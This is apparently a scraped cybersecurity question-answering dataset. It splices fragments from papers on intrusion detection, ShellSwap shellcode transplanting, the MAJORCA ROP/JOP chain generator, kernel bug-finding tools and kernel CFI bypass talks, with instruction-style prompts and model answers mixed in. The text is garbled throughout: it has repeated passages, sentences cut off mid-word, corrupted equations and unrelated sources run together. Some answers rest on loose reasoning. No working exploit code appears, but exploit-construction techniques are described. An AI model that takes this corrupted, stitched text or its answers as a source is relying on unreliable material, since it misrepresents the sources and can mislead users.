detection first establishes a state model of  the normal activity of the system and continuously updates it,  and then compares the users current activity with this normal  model. If the difference between the two exceeds the set  closed value, it is considered that an illegal attack has  occurred.  2 1( ) ( )n N i i iI f w f uf078 uf03duf03duf0e5        (1)  1()1xfxeuf02duf03duf02b                           (2)  Intrusion detection (Instruction Detection) refers to the  collection of information from the network or host, such as  security logs and audit records, and detection and analysis of  whether there is any violation of security policies.

Intrusion  detection system (Internttion Detection System, IDS) is a  security management system for computer systems and  networks. As an active and effective active security defense  technology, it can monitor the real-time traffic in the network  and determine whether any abnormal behavior enters the  system. If so, an alarm will be issued to prevent the entry of  abnormal behavior, thereby ensuring the confidentiality,  integrity and availability of the system or network resources.  The host-based intrusion detection system collects and  analyzes log files, port information, and device types of the  host, and provides visual analysis and policy management of  different types of intrusions.\"Improving Network-Level Security 1617A Level 3 penetration test, or acid test, is an attack from within the network.

Therefore, penetration testingshould be used cautiously, but still be used to attempt to locate vulnerabilities and to assess the overall operationof the protection program.SummaryThis chapter has presented several implementations of secure gateway and intrusion detection techniques,while focusing on the business impact of their implementation.

Enhancing network forensics Our research uses the Metasploit Framework (www.metasploit.com) and a test network of Windows com-puters to determine server response to buffer over\ufb02ows.In six of the seven TCP buffer-over\ufb02ow exploits tested,we found that patched servers returned unique applica-tion-layer responses. User Datagram Protocol (UDP) at-tacks are, by de\ufb01nition, connectionless and thereforearen\u2019t good candidates for response analysis. The results inTable 1 are consistent across Windows 2000 and XP ser-vice packs. A response of \u201cnone\u201d means that we receivedeither no packets or only a transport-layer response (such as an  ACKpacket). The error message\u2019s size is a useful fac-\"intrusion_detection_data.csv\" dataset. Once trained, the script  uses the trained model to detect any intrusions that Snort may  have omitted. Finally, the script establishes a threshold for the  number of detected intrusions within a 60-second interval. If  the number of detected intrusions for a particular signature ID  exceeds this threshold, an alert is generated to inform the user  that an intrusion has been detected.    Fig. 1.  Dataflow diagram of the proposed script  This code is an example of intrusion detection in a  distributed firewall using machine learning algorithms and the  PyShark library. It begins a traffic capture on the primary  firewall and filters packets based on the IP addresses of each  secondary firewall. Snort, an open-source intrusion detection  application, is then used to detect intrusions in the packets that  have been filtered. Using the \"intrusion_detection_data.csv\"  dataset, the code trains a Random Forest classification model  prior to detecting intrusions. This dataset contains  characteristics of network packets, including protocol, source  and destination IP addresses, source and destination ports, and  labels indicating whether the packet is legitimate or an  intrusion attempt. The model is trained to classify messages  into normal or intrusion categories. A decision threshold is set  to detect intrusions based on the probability of classifying  packets as an intrusion attempt after the model has been  trained. In the provided code example, this threshold has been  set to 0.5. Next, the code filters packets on each secondary  firewall and uses Snort to detect intrusions in the packets that  have been filtered. It then verifies detected intrusions and adds them to a dictionary for future reference. If an intrusion is  detected for the first time, a dictionary entry is created with the  detection time and the number of detections. If the intrusion  has been detected in the past, this condition examines to see ifAlthough it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace the path that the exploit runs on the program. We ensure tracingaccuracy in two ways: we record a dynamic trace of the exploit process (and require that our symbolic trace conform to the same instructions), and we pre-constrain the symbolic data to be equal to the original exploit. The former avoids the path explosion inherent in concolic execution exploration (because we only care about the branch that the exploit chooses), and the latter greatly simpli\ufb01es the job of the symbolic constraint solver during tracing (by providing it with a pre-determined solution). This method is similar to the pre-constraint tracing and the input pre-constraining approach proposed by Driller [ 30] (and, in fact, part of the implementation derives off of Driller\u2019s tracing module). The trace-directed symbolic execution takes a program and an original exploit and produces path constraints and the exploitable state. The exploitable state includes the symbolic value of registers and memory at the moment that the program starts to execute the shellcode. After this step completes,the pre-constraints introduced in the beginning are removed,making it possible to constrain some of the memory in the exploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program toexploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program to execute the same execution trace and triggers the vulnerability. IV . S HELLCODE TRANSPLANT After the exploitable state and the path constraints associated with it have been recovered, ShellSwap can attempt to re-\"calculations, the actual system can be obtained with the  model-the real optimal solution when the actual difference  exists, and the correlation between the subsystems can be a  non-linear correlation.  B. Complex System Network Intrusion  Anomaly detection is also called behavior-based detection,  which realizes detection by observing the difference between  the current activity and the historical normal activity of the  system. Anomaly detection first establishes a state model of  the normal activity of the system and continuously updates it,  and then compares the users current activity with this normal  model. If the difference between the two exceeds the set  closed value, it is considered that an illegal attack has  occurred.  2 1( ) ( )n N i i iI f w f uf078 uf03duf03duf0e5        (1)  1()1xfxeuf02duf03duf02b                           (2)  Intrusion detection (Instruction Detection) refers to the  collection of information from the network or host, such as  security logs and audit records, and detection and analysis of  whether there is any violation of security policies. Intrusioncollection of information from the network or host, such as  security logs and audit records, and detection and analysis of  whether there is any violation of security policies. Intrusion  detection system (Internttion Detection System, IDS) is a  security management system for computer systems and  networks. As an active and effective active security defense  technology, it can monitor the real-time traffic in the network  and determine whether any abnormal behavior enters the  system. If so, an alarm will be issued to prevent the entry of  abnormal behavior, thereby ensuring the confidentiality,  integrity and availability of the system or network resources.  The host-based intrusion detection system collects and  analyzes log files, port information, and device types of the  host, and provides visual analysis and policy management of  different types of intrusions.\"Improving Network-Level Security 1617A Level 3 penetration test, or acid test, is an attack from within the network. This is the best judge of thequality of the implementation of a company\u2019s security policy. A real attack from within a network can comefrom various sources, including disgruntled employees, accidental attacks, and brazen intruders who cansocially engineer their way into a company.Penetration testing should be considered very carefully in the implementation of an overall detectionprogram, but it can lead to the negative side effects one is trying to prevent. Therefore, penetration testingshould be used cautiously, but still be used to attempt to locate vulnerabilities and to assess the overall operationof the protection program.SummaryThis chapter has presented several implementations of secure gateway and intrusion detection techniques,while focusing on the business impact of their implementation. It is essential that the security professionalconsider the use of both                   Question: 'What is the best way to determine whether a security policy has been correctly imple-mented?'[/INST] The best way to determine whether a security policy has been correctly implemented is through a vulnerability assessment. This can be done by using tools like those provided by Tiger Tools Attack, which include penetration testing tools that can identify weaknesses and vulnerabilities in the network or system. These tools can help network professionals understand what additional steps are required to adequately protect their network based on the identified vulnerabilities. Additionally, other techniques such as checking logs, patches, backdoor signatures, and anomaly-based detection methods can also be used to determine whether a system has been compromised. Regular reviews and updates of the security policy are also important to ensure its continued relevance and effectiveness."}

It includes various techniques such as social engineering, risk assessment, port scans, and more. Social engineering involves manipulating individuals into revealing confidential information or performing actions that could compromise the security of the system. Risk assessment is the process of identifying, evaluating, and prioritizing potential risks to an organization's information assets. Other parts of a vulnerability assessment may include network scans, application testing, database testing, password cracking, and session hijacking, among others. By executing a comprehensive vulnerability assessment, organizations can identify vulnerabilities and threats to their systems and take steps to mitigate them."}

Typically, a backdoor is left for the intruder to reenter the computer or network at a later time. routeru2003 A device used to route IP traffic between networks.

A scan may include actions that attempt to identify the operating system version and the services running on the computer system. script kiddiesu2003 Individuals who find scripts on the Internet and use them to launch attacksdesk,systems programming, database programming, information security, data entry, and users. Information secu-rity should be separate from database and application development and maintenance, system programming,telecommunications, data management or administration, and users. System programmers should never haveaccess to application code, and application programmers should not have access to live production data. Kabay22noted that separation of duties should be applied throughout the development life cycle so that the personwho codes a program would not also test it, test systems and production systems are separate, and operatorscannot modify production programs.When appropriate, they are done on testsystems rather than production systems, because they can induce unhappybehavior from the target systems or network devices.A scan within an individual system can check a variety of aspects of thesystem:\u2022 Short or easy-to-guess passwords\u2022 Unauthorized privileged programs, such as setuid programs\u2022 Unauthorized programs in system directories\u2022 Unexpectedly long-running processes\u2022 Improper directory protections on user and system directories\u2022 Improper protections on system data files, such as the password file, devicefiles, or the operating-system kernel itself\u2022 Dangerous entries in the program search path (for example, the Trojanhorse discussed in Section 16.2.1), such as the current directory and anyeasily-written directories such as /tmp\u2022 Changes to system programs detected with checksum values\u2022 Unexpected or hidden network daemonsAny problems found by a security scan can be either fixed automatically orreported to the managers of the\"                   Question: 'Why are scans done on test systems rather than production systems?'[/INST] Scans are typically done on test systems instead of production systems for several reasons:\n\n1. Inducing unhappy behavior: Scans can put significant load on the target systems or network devices, which can cause performance degradation or even crashes. Running scans on production systems can disrupt business operations and negatively impact end-users.\n2. Separation of duties: Following the principle of least privilege, system programmers should not have access to application code, and application programmers should not have access to live production data. By performing scans on test systems, you ensure that only authorized personnel with the necessary permissions are conducting these activities.\n3. Controlled environment: Testing in a controlled environment allows you to understand the impact of the scan on the target system and evaluate the results more effectively. In a test environment, you can simulate various scenarios and analyze the outcomes without affecting the production systems.\n4. Reducing risks: Performing scans on test systems helps minimize the risk of exposing sensitive information or introducing vulnerabilities into the production environment. Additionally, it enables you to address any issues identified during the scan before they can potentially impact your production systems.\n5. Compliance: Adhering to industry best practices and regulatory requirements often mandates that scans be conducted in non-production environments. This ensures that organizations maintain a secure and compliant infrastructure while minimizing potential disruptions to their production systems."}

Scalability: Static host tables require manual updates every time there is a change in IP address or hostname. With a name server, you can make changes centrally and those changes will propagate to all clients that query the name server.\n2. Flexibility: With a name server, you can easily add or remove hosts without having to update every client's host table. This makes it easier to manage large networks.\n3. Redundancy: Name servers can be configured in a redundant setup, allowing for high availability and fault tolerance. If one name server goes down, another can take its place.\n4. Security: Name servers can provide additional security features, such as DNSSEC (Domain Name System Security Extensions), which can help prevent DNS spoofing and other attacks.\n\nHowever, there are also some drawbacks to using name servers. They can be more complex to set up and maintain than static host tables, and they can introduce additional latency in DNS queries. Additionally, name servers can be targeted by attackers, so it's important to implement appropriate security measures to protect them."}

{"query": "How much SLoC of the kernel code does kernel drivers account for?'", "Context": "\"in Windows XP [49]. These staggering numbers were attributed to lower overall code quality in drivers and im- proper implementations of the complex interactions with the kernel core by the third party supplying the driver. In 2011, Palix et al. [39] analyzed the Linux kernel again and showed that while drivers still accounted for the greatest number of bugs, which is likely because drivers make up 57% of the total code, the fault rates for drivers where no longer the highest. Our recent analy- sis of main line linux kernel commit messages found that 28% of CVE patches to the linux repository in the past year involved kernel drivers (19% since 2005), which is in line with previous studies [17]. Meanwhile, the mo- bile domain has seen an explosion of new devices, and thus new drivers, introduced in recent years. The lack of attention being paid to these drivers, and their potential danger to the security of the devices, has also not gone unnoticed [47]. Recent studies even purport that mobile kernel drivers are, again, the source of up to 85% of the reported bugs in the Android [48] kernel. Yet, we are unaware of any large-scale analysis of these drivers. In this work, we present D R. C HECKER , a fully- automated static-analysis tool capable of identifying numerous classes of bugs in Linux kernel drivers. DR. CHECKER is implemented as a completely modu- lar framework, where both the types of analyses (e.g., points-to or taint) and the bug detectors (e.g., integer over\ufb02ow or memory corruption detection) can be eas- ily augmented. Our tool is based on well-known pro- gram analysis techniques and is capable of performing both pointer and taint analysis that is \ufb02ow-, context-, and \ufb01eld-sensitive. D R.

KFENCE is basically a low-overhead address sanitizer, but actually so low-overhead that it can run in production kernels on live systems whereas the traditional kernel address sanitizer (KASAN) so far was only used in testing and fuzzing setups. In this post I will outline how it works and how it differs from the kernel address sanitizer.  # Kernel Address Sanitizer  First of all, let\u2019s get back to address sanitizers. Generic KASAN as implemented in the Linux kernel uses a similar approach to userspace ASANs as implemented in gcc and clang. A \u2018shadow region\u2019 of memory is allocated where, for each possible memory address, a flag is stored which indicates if a memory address is safe to access. As one bit is used per address, this uses an amount of memory equal to 12.5% of the total kernel address space.  When a memory address is accessed for read or write, the shadow memory is first checked to see if the address is valid. If not, it means memory is being accessed in an invalid manner, i.e. there is a buffer overflow or a use-after- free condition and an error report is generated.  If we were able to do these checks constantly then of course a large amount of the security issues we deal with due to the use of memory unsafe languages would be history. However, validating every single memory access comes with a huge added performance overhead that is unacceptable in production kernels.  # KFENCE  Enter KFENCE. Although KFENCE is designed for the same purpose and detects some of the same errors, the way it works and the amount of errors it will catch is quite different. Most importantly, it is very prone to not spotting some errors which I will explain below.This is the samecode the kernel also produces.x0cNormal tracking mode (not implemented in Linux 2.0.24) sends an escape sequence on both button press and release.Modifier information is also sent. It is enabled by sending ESC [ ? 1000 h and disabled with ESC [ 1000 l. On button pressor release, xterm sends ESC [ M bxy. The low two bits of b encode button information: 0=MB1 pressed, 1=MB2 pressed,2=MB3 pressed, 3=release. The upper bits encode what modifiers were down when the button was pressed and are addedtogether: 4=Shift, 8=Meta, 16=Control. Again, x and y are the x and y coordinates of the mouse event.

Besides, as can be seen from Rule 5 in Figure 9, when there are two fetches in a loop, the second fetch of the last iteration and the \ufb01rst fetch of the next iteration will be matched as a double fetch. This case should be removed as false positive because the user pointer should have been changed when crossing the iter- ations and these two fetches are getting di \ufb00erent values. Moreover, cases that use an array to copy di \ufb00erent values inside a loop also cause false positives. 4 Evaluation In this section, we present the evaluation of our study, which includes two parts: the statistics of the manual analysis, and the results of the re\ufb01ned approach when applied to three open source kernels: Linux, Android, and FreeBSD. We obtained the most up-to-date versions available at the time of the analysis. 4.1 Statistics and Analysis In Linux 4.5, there are 52,881 \ufb01les in total and 39,906 of them are source \ufb01les (with a \ufb01le extension of .c or .h), which are our analysis targets (other \ufb01les are ignored). 17,532 source \ufb01les belong to drivers (44%). After the basic pattern matching of the source \ufb01les and the man- ual inspection to remove false positives, we obtained 90 double-fetch candidate \ufb01les for further inspection. We categorized the candidates into the three double-fetch scenarios Size Checking ,Type Selection and Shallow Copy . They are the most common cases on how a double fetch occurs while user space data is copied to the kernel space and how the data is then used in the kernel. We have discussed these scenarios in detail with real double- fetch bug examples in the previous section. As shown in Table 1, of the 90 candidates we found, 30 were re- lated to the size checking scenario, 11 were related to the type selection scenario, and 31 were related to the shal- low copy scenario, accounting for 33%, 12%, and 34%For a more comprehensive understanding of howWindows works \u201cunder the metal,\u201d refer to Microsoft Windows Internals 4thEdition, byRussinovich and Solomon.Windows InternalsIf you were to step back and think about the contents of your operating system\u2019s addressspace in both virtual and physical memory, you would probably be able to classify all ofthe bytes in memory into one of two categories: data or code.

CHECKER assumes that all the kernel API functions are safe and correctly used (Assumption 1 in Section 3 ). Bugs that oc- cur because of improper kernel API usage will be missed by D R. CHECKER . However, other tools (e.g., APISan [64]) have been developed for \ufb01nd- ing these speci\ufb01c types of bugs and could be used to complement D R. CHECKER . \u2022Non-input-validation bugs: DR. CHECKER specif- ically targets input validation vulnerabilities. As such, non-input validation vulnerabilities (e..g, side channels or access control bugs) cannot be detected. 7 Evaluation To evaluate the ef\ufb01cacy of D R. CHECKER , we performed a large-scale analysis of the following nine popular mo- bile device kernels and their associated drivers (437 in total). The kernel drivers in these devices range from very small components (31 LOC), to much more com- plex pieces of code (240,000 LOC), with an average of 7,000 LOC per driver. In total, these drivers contained over 3.1 million lines of code. However, many of these kernels re-use the same code, which could result in ana- lyzing the same entry point twice, and in\ufb02ate our results. Thus, we have grouped the various kernels based on their underlying chipset, and only report our results based on these groupings:Table 2: Summary of warnings produced by popular bug- \ufb01nding tools on the various kernels that we analyzed.

Introduction Fuzzing has become one of the most popular methods for finding bugs and vulnerabilities due to its practicability and effectiveness. For example, in the context of large-scale and stateful programs such as operating system kernels, the state-of-the-art operating system kernel fuzzer, syzkaller [1], has found more than 4.6k bugs in the Linux kernel over the past few years, more than 3.6k of which have been fixed [2]. One necessary component of syzkaller is a collection of syscall descriptions that are often provided by human experts. As the primary interface between the user space and kernel space is syscall, the fuzzer needs to be aware of the syscalls that are available on an operating system kernel, values of interest for each syscall, and explicit dependencies between syscalls [3]. For syzkaller, such syscall descrip- tions can be provided using a declarative language called syzlang [4]. However, to our knowledge, current syscall descriptions are largely written manually [4], which is bothtime-consuming and error-prone. Indeed, in our study, we find that existing manually-curated syscall descriptions can miss dependencies and/or syscall interfaces, and even in- correct or out-of-date descriptions. It has also been shown that incomplete syscall descriptions is a major root cause limiting the code coverage achieved by syzkaller [3]. More- over, syscall description generation is not a one-time effort. Descriptions need to be continuously updated as the kernel evolves ( e.g., there are on average 200 commits daily to Linux mainline [5]). Last but not least, not all kernel drivers have manually-curated syscall descriptions [6]. Compared to the core Linux kernel, kernel drivers account for about 71.9% SLoC of the kernel code and therefore a large fraction of the attack surface that needs to be tested as well [3]. There exist limited solutions to generate syscall descrip- tions. DIFUZE [6] attempts to generate syscall descriptions\"", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.                   Contextual Information:                   \"in Windows XP [49]. These staggering numbers were attributed to lower overall code quality in drivers and im- proper implementations of the complex interactions with the kernel core by the third party supplying the driver. In 2011, Palix et al. [39] analyzed the Linux kernel again and showed that while drivers still accounted for the greatest number of bugs, which is likely because drivers make up 57% of the total code, the fault rates for drivers where no longer the highest. Our recent analy- sis of main line linux kernel commit messages found that 28% of CVE patches to the linux repository in the past year involved kernel drivers (19% since 2005), which is in line with previous studies [17]. Meanwhile, the mo- bile domain has seen an explosion of new devices, and thus new drivers, introduced in recent years. The lack of attention being paid to these drivers, and their potential danger to the security of the devices, has also not gone unnoticed [47]. Recent studies even purport that mobile kernel drivers are, again, the source of up to 85% of the reported bugs in the Android [48] kernel. Yet, we are unaware of any large-scale analysis of these drivers. In this work, we present D R. C HECKER , a fully- automated static-analysis tool capable of identifying numerous classes of bugs in Linux kernel drivers. DR. CHECKER is implemented as a completely modu- lar framework, where both the types of analyses (e.g., points-to or taint) and the bug detectors (e.g., integer over\ufb02ow or memory corruption detection) can be eas- ily augmented. Our tool is based on well-known pro- gram analysis techniques and is capable of performing both pointer and taint analysis that is \ufb02ow-, context-, and \ufb01eld-sensitive. D R.

A sharedsecret is a password agreed upon by the two device administrators in advance. When the administrators tryto communicate, each must supply the agreed-upon password. Authentication based on certificates is moresecure than password-based authentication because of distribution and formation. Passwords have to bedifficult to guess and shared in a secure fashion.

MAJORCA architecture We implemented described techniques in MAJORCA (Multi Architecture JOP and ROP Chain Assembler) tool. It is alibrary written in Python that allows users to set up ROP chai ns via API calls. We support both Linux and Windows operating systems. It is a lightweight and simple implementation for special input language determining ROP chain. Moreover, these calls can be integrated into any Python script that use rs may utilize for exploit generation. MAJORCA supports x86 architecture (both 32 and 64-bit) and MIPS. Figure 6 presents MAJORCA architecture. The binary is inputted into ROPGadget that searches for gadgets.

Short pieces of code called gadgets are chained toge ther to execute some payload. Code-reuse attacks can exploit vul - nerabilities in the presence of operating system protectio n that prohibits data memory execution. The ROP chain constructio n task is the code generation for the virtual machine de\ufb01ned by an exploited executable. It is crucial to understand how power ful ROP attacks can be. Such knowledge can be used to improve software security. We implement MAJORCA that generates ROP and JOP payloads in an architecture agnostic manner and thoroughly consider restricted symbols such as null bytes t hat terminate data copying via strcpy. The paper covers the whol e code-reuse payloads construction pipeline: cataloging ga dgets, chaining them in DAG, scheduling, linearizing to the ready- to- run payload. MAJORCA automatically generates both ROP and JOP payloads for x86 and MIPS. MAJORCA constructs payloads respecting restricted symbols both in gadget addresses and data. We evaluate MAJORCA performance and accuracy with rop- benchmark and compare it with open-source compilers. We sho w that MAJORCA outperforms open-source tools. We propose a ROP chaining metric and use it to estimate the probabilities of successful ROP chaining for different operating systems with MAJORCA as well as other ROP compilers to show that ROP chaining is still feasible. This metric can estimate the ef\ufb01 ciency of OS defences.

I. I NTRODUCTION Modern software is rapidly developing. Programming lan- guages with non-safety memory operations are on the scene yet. Despite the widely adopted security development lifec yclenwhile others use SMT solvers [19, 27]. On the \ufb01nal stage, the generated ROP chain may be embedded in multi staged exploits [40, 41]. We search ROP and JOP gadgets and classify them by pa- rameterized types [42] via instruction concrete interpret ation. Classi\ufb01ed gadgets constitute a gadget catalog that is proce ssed by \ufb01ltering and prioritizing. Filtering and prioritizing r educe search space. The gadget catalog is also extended by JOP combining. Search algorithm builds chains by searching for suitable gadgets and their combination considering their s e- mantics. We also thoroughly consider restricted symbols bo th in gadget addresses and data. It is crucial to take account of restricted symbols during chain generation. For example, if the strcpy function pro- cesses input data bytes, they cannot contain zero. It is wort h noting that restricted symbols can be both in gadget address es and in data. However, just a few authors consider restricted symbols in the chain generation methods [17]. The paper makes the following contributions: 1) We present the method to automatically generate both ROP and JOP payloads in an architecture agnostic manner. 2) We present an algorithm that considers restricted sym- bols both in gadget addresses and data. 3) We implement presented techniques in MAJORCA that can generate both ROP and JOP chains for x86 and MIPS considering restricted symbols thoroughly. 4) We present rop-benchmark [43] to compare MAJORCA with open-source rop-compilers. 5) We propose ROP chaining metric and use it to estimate the probability of successful ROP chaining for different operating systems with the portfolio of ROP compilers. II. G ADGET CATALOGING MAJORCA uses ROPGadget [25] to search for gadgets in binaries. It uses the back searching algorithm [7] that star ts from every encountered ret instruction. The experiments led us to limit the depth by 40 bytes since the bigger value does not result in more gadgets. Furthermore, we discard gadgetsnsuccessful, then the ROP chain is not workable. Ropper has dashes in this column because it does not correctly signalize that chain generation failed. 3) TL \u2014 the number of \ufb01les, for which a tool runtime exceeds the time limit of 1 hour. We propose to de\ufb01ne a ROP chaining metric as follow: M=OK/HAS SYSCALL , whereOK is the number of \ufb01les such that at least one tool from the portfolio successfu lly generates a workable ROP chain, and HASSYSCALL is the number of \ufb01les containing the system call gadget. The smaller value Mthe better OS is defended from ROP chaining. The Table II contains metric values for different operating systems (CentOS 7, Debian 10, OpenBSD 6.2, OpenBSD 6.4) in the row heading \u201dROP chaining metric\u201d. We can conclude that Debian 10 is less defended from ROP (and JOP) chaining than other operating systems. Moreover, the OpenBSD activi ty of reducing the number of gadgets noticeably reduces ROP chaining metric. However, almost half of binaries containi ng syscall gadgets can be used for successful ROP chaining. Considering the results in Table II, we can conclude that MAJORCA outperforms other open-source tools. Besides, MAJORCA covers almost all successful cases of other tools. It does not cover only 8 binary \ufb01les: 1) 2 timeouts for OpenBSD clang binaries. It happens due to big \ufb01le sizes. Later, we can add a simple heuristic for such huge \ufb01les because they probably contain almost any gadgets, so the tool may have a special case to avoid excessive search. 2) 2 unworkable ROP chains were generated due to impre- cise gadget classi\ufb01cation. 3) 4 ROP chains were not generated because MAJORCA does not support gadgets ending with call instructions. It is a technical limitation that can be \ufb01xed in the future. Tools represented in Table II do not support MIPS architec- ture. We benchmark MAJORCA for MIPS without them on32-bit Malta Linux. MAJORCA successfully generates 112 ROP chains (OK) out of 529 \ufb01les. Test \ufb01les were acquirednture. We benchmark MAJORCA for MIPS without them on32-bit Malta Linux.

II. G ADGET CATALOGING MAJORCA uses ROPGadget [25] to search for gadgets in binaries. It uses the back searching algorithm [7] that star ts from every encountered ret instruction. The experiments led us to limit the depth by 40 bytes since the bigger value does not result in more gadgets. Furthermore, we discard gadgetsnchain of gadgets is assembled from frames. The gadget frame contains values of gadget parameters (e.g., the value loade d into the register from the stack) and the next gadget address . The frame beginning is determined by the value of the stack pointer before executing the \ufb01rst gadget instruction. A. Gadget Preprocessing Gadget catalog does not represent gadgets that load multipl e values from the stack to registers at once, e.g., pop rax ; pop rbx ; pop rdi ; ret1. We derive these semantics by combining several gadgets from the catalog. We \ufb01nd all gadgets that load registers and have same virtual address. T he \ufb01rst gadget loads rax, the second one loads rbx, and the third one loads rdi. Based on these gadgets, we construct gadgets with any non-trivial combination of loadable regis ters: 1)rax,rbx,rdi; 2)rax,rbx; 3)rax,rdi; 4)rax; 5)rbx,rdi; 6)rbx; 7)rdi. Then we add them all into the catalog. We actually have several catalog entries for the sa me assembly but they have different sets of output and clobbere d registers, e.g., the gadget loading rax andrbx hasrdi as clobbered register, the gadget loading rax andrdi hasrbx as clobbered register. The support of such gadgets is a key feature in comparison with Schwartz et al. [9]. MAJORCA can use both ROP and JOP gadgets. We com- bine every JOP gadget with a ROP gadget into a bigger gadget similar to ROPium [26] (ex. ROPGenerator). Every JOP gadget is complemented by the ROP gadget that loads the next address value to the jump target register. The ROP gadge t output registers should not intersect with the JOP gadget in put registers. For instance, \u2022pop rax ; pop rcx ; ret \u2022pop rdx ; jmp rcx . The next gadget address is loaded from the stack to register rcx bypop rcx . The combined gadget is just the usual ROP gadget that can be used as any other ROP gadget. We \ufb01lter and prioritize gadgets [47] to reduce the ROP chain construction time. We get rid of a gadget ifnture. We benchmark MAJORCA for MIPS without them on32-bit Malta Linux. MAJORCA successfully generates 112 ROP chains (OK) out of 529 \ufb01les. Test \ufb01les were acquired from Malta Debian OS. All of them contain syscall gadget.

I. I NTRODUCTION Modern software is rapidly developing. Programming lan- guages with non-safety memory operations are on the scene yet. Despite the widely adopted security development lifec yclenwhile others use SMT solvers [19, 27]. On the \ufb01nal stage, the generated ROP chain may be embedded in multi staged exploits [40, 41]. We search ROP and JOP gadgets and classify them by pa- rameterized types [42] via instruction concrete interpret ation. Classi\ufb01ed gadgets constitute a gadget catalog that is proce ssed by \ufb01ltering and prioritizing. Filtering and prioritizing r educe search space. The gadget catalog is also extended by JOP combining. Search algorithm builds chains by searching for suitable gadgets and their combination considering their s e- mantics. We also thoroughly consider restricted symbols bo th in gadget addresses and data. It is crucial to take account of restricted symbols during chain generation. For example, if the strcpy function pro- cesses input data bytes, they cannot contain zero. It is wort h noting that restricted symbols can be both in gadget address es and in data. However, just a few authors consider restricted symbols in the chain generation methods [17]. The paper makes the following contributions: 1) We present the method to automatically generate both ROP and JOP payloads in an architecture agnostic manner. 2) We present an algorithm that considers restricted sym- bols both in gadget addresses and data. 3) We implement presented techniques in MAJORCA that can generate both ROP and JOP chains for x86 and MIPS considering restricted symbols thoroughly. 4) We present rop-benchmark [43] to compare MAJORCA with open-source rop-compilers. 5) We propose ROP chaining metric and use it to estimate the probability of successful ROP chaining for different operating systems with the portfolio of ROP compilers. II. G ADGET CATALOGING MAJORCA uses ROPGadget [25] to search for gadgets in binaries. It uses the back searching algorithm [7] that star ts from every encountered ret instruction. The experiments led us to limit the depth by 40 bytes since the bigger value does not result in more gadgets. Furthermore, we discard gadgetsnchain of gadgets is assembled from frames. The gadget frame contains values of gadget parameters (e.g., the value loade d into the register from the stack) and the next gadget address . The frame beginning is determined by the value of the stack pointer before executing the \ufb01rst gadget instruction. A. Gadget Preprocessing Gadget catalog does not represent gadgets that load multipl e values from the stack to registers at once, e.g., pop rax ; pop rbx ; pop rdi ; ret1. We derive these semantics by combining several gadgets from the catalog. We \ufb01nd all gadgets that load registers and have same virtual address. T he \ufb01rst gadget loads rax, the second one loads rbx, and the third one loads rdi. Based on these gadgets, we construct gadgets with any non-trivial combination of loadable regis ters: 1)rax,rbx,rdi; 2)rax,rbx; 3)rax,rdi; 4)rax; 5)rbx,rdi; 6)rbx; 7)rdi. Then we add them all into the catalog. We actually have several catalog entries for the sa me assembly but they have different sets of output and clobbere d registers, e.g., the gadget loading rax andrbx hasrdi as clobbered register, the gadget loading rax andrdi hasrbx as clobbered register. The support of such gadgets is a key feature in comparison with Schwartz et al. [9]. MAJORCA can use both ROP and JOP gadgets. We com- bine every JOP gadget with a ROP gadget into a bigger gadget similar to ROPium [26] (ex. ROPGenerator). Every JOP gadget is complemented by the ROP gadget that loads the next address value to the jump target register. The ROP gadge t output registers should not intersect with the JOP gadget in put registers. For instance, \u2022pop rax ; pop rcx ; ret \u2022pop rdx ; jmp rcx . The next gadget address is loaded from the stack to register rcx bypop rcx . The combined gadget is just the usual ROP gadget that can be used as any other ROP gadget. We \ufb01lter and prioritize gadgets [47] to reduce the ROP chain construction time. We get rid of a gadget ifnture. We benchmark MAJORCA for MIPS without them on32-bit Malta Linux. MAJORCA successfully generates 112 ROP chains (OK) out of 529 \ufb01les. Test \ufb01les were acquired from Malta Debian OS. All of them contain syscall gadget. Unworkable ROP chains were not generated (F is 0). The only one ROP chain generation has a timeout (TL is 1). Moreover, we updated rop-benchmark with tests containing restricted symbols. The last row in Table II contains result s only for MAJORCA because other tools generate no workable payloads. Even having banned slash symbol ( 2f), MAJORCA suc- cessfully generates a signi\ufb01cant fraction of ROP chains gen - erated without restricted symbols. IX. C ONCLUSION In the paper we present techniques to construct ROP chains automatically. We implemented them in the MAJORCA tool. It can generate ROP chains for registers initialization, me mory initialization, system and function calls for both x86 and MIPS architecture. The tool \ufb01nds both ROP and JOP gadgets and classi\ufb01es them by semantic types. After that, MAJORCA \ufb01lters and sorts them by quality. It builds a graph of moves between registers. It also creates DAGs initializing memor y and registers. Then, the tool iteratively selects DAGs to construct the requested ROP chain. In the end, MAJORCAbetween registers. It also creates DAGs initializing memor y and registers. Then, the tool iteratively selects DAGs to construct the requested ROP chain. In the end, MAJORCA generates the ROP chain by the \ufb01rst graph that has successful ly been scheduled. The generated ROP chain output format is a Python script which is human readable and easily extendable with custom parts. We developed algorithms that solve the task of generating ROP chains in the presence of restricted symbols. First of all, MAJORCA removes all gadgets containing restricted symbols in addresses. Secondly, we use arithmetic operatio ns to obtain register or memory values containing restrictedn\"                   Question: 'What does MAJORCA classify ROP and JOP gadgets by?[/INST] MAJORCA classifies ROP and JOP gadgets by semantic types using parameterized instructions concrete interpretation. Classified gadgets constitute a gadget catalog that is processed by filtering and prioritizing to reduce the search space. Additionally, MAJORCA supports both ROP and JOP gadgets and combines them into larger gadgets while considering their semantics and restricted symbols."}

Control-flow integrity is hard to get right at the best of times, and even harder still in kernel-space. This presentation shows that kCFI (even when hardware-assisted) doesnt work when code pages can be rearranged with an arbitrary read/write vulnerability. Its a little bit theoretical in terms of impact because the kCFI they use is \"FineIBT\", which I dont think is widely used yet.      Anyway, this kind of thing is exactly why Apple has spent a lot of time building KTRR/CTRR (ed: not PPL like this post originally included) for iOS, which is the most robust approach to preventing this stuff that I know of. Windows currently has Kernel Data Protection (KDP) and they seem to be early adopters of Intels HLAT, so they should be OK once thats available on more devices and they enable it by default. The Android situation is a bit more concerning, but at least Samsungs Knox is trying.      * \"Make KSMA Great Again: The Art of Rooting Android Devices by GPU MMU Features\" by Yong Wang. A deep dive into the MMU internals of ARMs Mali GPU, and a detailed discussion of one of the many recent vulnerabilities in the Mali driver (although I cant find the CVE for the issue, it was fixed here). Their observation is that with a sufficiently powerful vulnerability you can use a similar exploit technique to Kernel Space Mirroring Attacks (KSMA)/ret2dir, but using the GPUs MMU instead. Essentially you end up with a GPU memory mapping that is aliased to the CPU for arbitrary physical 